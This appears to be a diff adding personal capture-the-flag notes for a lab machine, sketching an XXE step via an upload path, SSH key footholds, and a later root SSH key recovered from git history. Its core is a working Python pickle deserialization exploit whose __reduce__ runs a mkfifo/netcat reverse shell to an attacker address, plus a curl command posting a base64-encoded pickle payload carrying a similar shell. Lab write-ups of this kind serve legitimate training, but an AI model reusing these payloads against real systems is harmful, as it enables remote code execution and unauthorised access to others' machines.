@@ -1,0 +1,33 @@
+for foothold, take note of what the webpage says in terms of the structure of the xml document...
+
+the /upload get uploaded to the /uploads dir but do not show anything
+
+hence, you must perform the XXE in the /upload file path (must not get 500 internal error)
+
+
+
+
+Foothold 1:
+
+you know how it is ssh id_rsa (starting point)
+
+
+Foothold 2
+
+curl -X POST -H "Content-Type: text/plain"  http://10.129.1.79:5000/newpost -d "Y3Bvc2l4CnN5c3RlbQpwMAooUydybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC4xMC4xNC43MCA0NDMgPi90bXAvZicKcDEKdHAyClJwMwou"
+
+import pickle
+import base64
+import os
+>>> class Exploit(object):
+...     def __init__(self, cmd):
+...         self.cmd = cmd
+...     def __reduce__(self):
+...         return (os.system, (self.cmd,))
+
+base64.urlsafe_b64encode(pickle.dumps(Exploit('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f')))
+
+
+find the .git project, git log --oneline enumerate
+restore and get root ssh key
+
